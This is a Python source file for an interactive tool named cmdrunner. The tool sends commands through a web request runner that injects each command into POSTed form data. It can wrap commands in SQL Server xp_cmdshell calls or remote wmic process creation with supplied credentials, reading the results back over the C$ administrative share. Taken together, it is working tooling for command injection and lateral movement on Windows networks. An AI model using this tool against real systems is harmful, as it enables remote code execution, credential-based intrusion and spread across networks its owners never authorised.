import argparse
import json
import os
import random
import readline
import requests
import urllib.parse

class CmdRunnerException(Exception):
    pass

class CmdBase:
    args = []
    default_args = {}

    def __init__(self, *args, **kwargs):
        """
        Permissive __init__ method to assign object attributes from vrious sources:
          <args> matching the order of the <cls.args> attribute
          <kwargs> assigning each key, value pair as attributes
          <cls.default_args> assign each unset key, value pair as default attributes
        """
        # Assign arguments based on the class args variable
        for index, arg in enumerate(self.args):
            if index >= len(args):
                break
            setattr(self, arg, args[index])

        # Assign all kwargs
        for k, v in kwargs.items():
            if not k.startswith("_"):
                setattr(self, k, v)

        # Assign all default values
        for k, v in self.default_args.items():
            try:
                getattr(self, k)
            except AttributeError:
                setattr(self, k, v)

        # Check all required arguments exist
        for arg in self.args:
            try:
                getattr(self, arg)
            except AttributeError:
                raise TypeError("{}.__init__() Missing argument '{}'".format(self.__class__.__name__, arg))

    @classmethod
    def get_subclasses(cls):
        def _subclasses(cls):
            return set(cls.__subclasses__()).union([s for c in cls.__subclasses__() for s in _subclasses(c)])
        return {cls, *_subclasses(cls)}

    @classmethod
    def get_help(cls):
        lines = []
        for index, line in enumerate(cls.help.strip("\n").splitlines()):
            if index == 0:
                padding = line.replace(line.lstrip(), "")
            lines.append(line.replace(padding, "", 1))
        return "\n".join(lines)

    def get_instance(self):
        output = [self.__class__.__name__]
        for arg in self.args:
            output.append("\t{}: {}".format(arg, str(getattr(self, arg))))
        for arg in [x for x in sorted(self.__dict__.keys()) if not x.startswith("_")]:
            if arg in self.args:
                continue
            output.append("\t{}: {}".format(arg, str(getattr(self, arg))))
        return "\n".join(output)

    def save(self):
        output = {"__classname__" : self.__class__.__name__}
        for arg in self.args or [x for x in sorted(self.__dict__.keys()) if not x.startswith("_")]:
            output[arg] = getattr(self, arg)
        return output

    @classmethod
    def load(cls, instance):
        return cls(**instance)


class CmdRunner(CmdBase):
    def run(self, cmd):
        """
        Simple CmdRunner which just prints the command.
        """
        return cmd

    def encode(self, cmd):
        return cmd

class WebRunner(CmdRunner):
    args = ("url", "data")
    default_args = {
        "replace" : "***"
    }

    def run(self, cmd):
        data = self.data.replace(self.replace, cmd)
        r = requests.post(self.url, headers={"Content-Type" : "application/x-www-form-urlencoded"}, data=data)
        return r.text

    def encode(self, cmd):
        return urllib.parse.quote_plus(cmd)

class CmdEncoder(CmdBase):
    help = """
    Basic command encoder.
    """

    def encode(self, cmd):
        """
        Simple CmdEncoder which just returns the command as is.
        """
        return cmd

class XpCmdShellEncoder(CmdEncoder):
    help = """
    XpCmdShell encoder.
    """

    def encode(self, cmd):
        cmd = cmd.replace("'", "''")
        return "EXEC xp_cmdshell '{}';".format(cmd)

class WinCmdEncoder(CmdEncoder):
    def encode(self, cmd):
        return "cmd /S /C \"{}\"".format(cmd)

class WmicEncoder(CmdEncoder):
    args = ("host", "username", "password")
    default_args = {
        "host" : None,
        "username" : None,
        "password" : None,
        "delay" : 2,
        "output" : True
    }

    def encode(self, cmd):
        host = self.host or "localhost"
        wmic_args = []
        if self.host is not None:
            wmic_args.append("/NODE:\"{}\"".format(self.host))
            wmic_args.append("/User:\"{}\"".format(self.username))
            wmic_args.append("/Password:\"{}\"".format(self.password))

        if self.output:
            alphabet = "ABCDEFGHJIKLMNOPQRSTUVWXYZabcdefghjiklmnopqrstuvwxyz0123456789"
            tmp_dir = "".join(random.choice(alphabet) for x in range(8))
            tmp_path = "{}\\{}.log".format(tmp_dir, "".join(random.choice(alphabet) for x in range(8)))
            remote_cmd = WinCmdEncoder().encode("{} > C:\\{}".format(cmd, tmp_path)).replace("\"", "\\\"").replace(">", "^>")
            cmd = " && ".join([
              "mkdir \\\\{}\\C$\\{}".format(host, tmp_dir),
              "wmic {} process call create \"{}\" >nul".format(" ".join(wmic_args), remote_cmd),
              "ping -n {} 127.0.0.1 >nul".format(self.delay),
              "type \\\\{}\\C$\\{}".format(host, tmp_path),
              "rmdir /S /Q \\\\{}\\C$\\{}".format(host, tmp_dir)
            ])
            return cmd

        cmd = cmd.replace("\"", "\\\"").replace(">", "^>")
        return "wmic {} process call create \"{}\"".format(" ".join(wmic_args), cmd)

def print_help():
    print("Help text here")

def parse_cmd(cmd):
    if not cmd.startswith("$"):
        raise CmdRunnerException("Not a CmdRunner command")
    _cmd = cmd.strip().split(" ", 1)
    if len(_cmd) == 1:
        return cmd.strip("$"), []
    parts = []
    cmd, rest = _cmd
    rest = rest.lstrip()
    while len(rest):
        if rest.startswith("\""):
            escape = False
            for i, c in enumerate(rest[1:]):
                if c == "\\":
                    escape = True
                else:
                    if c == "\"" and not escape:
                        break
                    escape = False
            parts.append(rest[1 : i + 1])
            rest = rest[i + 2:]
        else:
            _parts = rest.split(" ", 1)
            if len(_parts) == 2:
                part, rest = _parts
            else:
                part, rest = _parts[0], ""
            parts.append(part)
        rest = rest.lstrip()
    return cmd.lstrip("$"), parts

def execute(cmd, runner, encoders):
    for encoder in encoders[::-1]:
        cmd = encoder.encode(cmd)
    cmd = runner.encode(cmd)
    output = runner.run(cmd)
    print("\n".join("<<< {}".format(x) for x in output.splitlines()))

def print_runners():
    print("Runners:")
    for runner in sorted(CmdRunner.get_subclasses(), key=lambda x: x.__name__):
        print("\t{}".format(runner.__name__))

def print_encoders():
    print("Encoders:")
    for encoder in sorted(CmdEncoder.get_subclasses(), key=lambda x: x.__name__):
        print("\t{}".format(encoder.__name__))

def load_session(session_file):
    session = {}
    if not os.path.isfile(session_file):
        raise CmdRunnerException("Session file '{}' does not exist".format(session_file))
    with open(session_file) as f:
        session = json.load(f)
    available_runners = {x.__name__ : x for x in CmdRunner.get_subclasses()}
    available_encoders = {x.__name__ : x for x in CmdEncoder.get_subclasses()}
    try:
        runner = available_runners[session["runner"]["__classname__"]].load(session["runner"])
        encoders = [available_encoders[x["__classname__"]].load(x) for x in session["encoders"]]
    except KeyError:
        raise CmdRunnerException("Invalid session")
    return runner, encoders

def print_session(runner, encoders):
    print("Runner:")
    print("\n".join("\t{}".format(x) for x in runner.get_instance().splitlines()))
    if len(encoders):
        print("Encoders:")
        for index, encoder in enumerate(encoders):
            print("[{}]: {}".format(index, "\n".join("\t{}".format(x) for x in encoder.get_instance().splitlines())))

if __name__ == "__main__":
    parser = argparse.ArgumentParser(prog="cmdrunner")
    parser.add_argument("--session", "-s", type=str, default=None)
    args = parser.parse_args()

    if args.session is not None:
        runner, encoders = load_session(args.session)
        print_session(runner, encoders)
    else:
        runner = CmdRunner()
        encoders = []
        print_runners()
        print_encoders()

    running = True
    while running:
        try:
            cmd = input(">>> ").strip()

            # Ignore empty commands
            if len(cmd) == 0:
                continue

            # Here document style multi line inputs
            if cmd.startswith("<<"):
                tag = cmd.replace("<<", "").strip()
                cmd = ""
                _cmd = input("... ")
                while _cmd.strip() != tag:
                    cmd += "{}\n".format(_cmd)
                    _cmd = input("... ")

            if cmd in ["$help", "help", "$h"]:
                print_help()
            elif cmd in ["$exit", "exit", "$quit", "quit", "$q"]:
                print("Quitting...")
                running = False
            elif cmd.startswith("$"):
                cmd, args = parse_cmd(cmd)

                if cmd == "print_session":
                    print_session(runner, encoders)
                elif cmd == "load_session":
                    if len(args) != 1:
                        raise CmdRunnerException("$load_session requires 1 argument")
                    runner, encoders = load_session(args[0])
                elif cmd == "save_session":
                    if len(args) != 1:
                        raise CmdRunnerException("$save_session requires 1 argument")
                    session = {
                      "runner" : runner.save(),
                      "encoders" : [x.save() for x in encoders],
                    }
                    with open(args[0], "w") as f:
                        json.dump(session, f)
                elif cmd == "push_encoder":
                    if len(args) == 0:
                        raise CmdRunnerException("$push_encoder requires at least 1 argument")
                    encoder = args[0]
                    args = args[1:]
                    available_encoders = {x.__name__.lower() : x for x in CmdEncoder.get_subclasses()}
                    if not encoder.lower() in available_encoders:
                        raise CmdRunnerException("'{}' is not a valid encoder".format(encoder))
                    encoder = available_encoders[encoder.lower()]
                    try:
                        encoders.append(encoder(*args))
                    except TypeError:
                        raise CmdRunnerException("'{}' requires arguments:\n{}".format(encoder.__name__, "\n".join("\t{}".format(x) for x in encoder.help().splitlines())))
                elif cmd == "pop_encoder":
                    index = -1
                    if len(args) == 1:
                        try:
                            index = int(args[0])
                            if index >= len(encoders):
                                raise ValurError()
                        except ValueError:
                            raise CmdRunnerException("{} is no a valider encoder index")
                    if len(encoders) == 0:
                        raise CmdRunnerException("Cannot pop from an empty encoder list")
                    encoders.pop(index)
                elif cmd == "set_runner":
                    if len(args) == 0:
                        raise CmdRunnerException("$set_runner requires at least 1 argument")
                    runner = args[0]
                    args = args[1:]
                    available_runners = {x.__name__.lower() : x for x in CmdRunner.get_subclasses()}
                    if not runner.lower() in available_runners:
                        raise CmdRunnerException("'{}' is not a valid runner".format(runner))
                    runner = available_runners[runner.lower()]
                    try:
                        runner = runner(*args)
                    except TypeError:
                        raise CmdRunnerException("'{}' requires arguments:\n{}".format(runner.__name__, "\n".join("\t{}".format(x) for x in runner.help().splitlines())))
                elif cmd == "list_encoders":
                    print_encoders()
                elif cmd == "list_runners":
                    print_runners()
            else:
                execute(cmd, runner, encoders)
        except KeyboardInterrupt:
            print()
        except CmdRunnerException as e:
            print(e)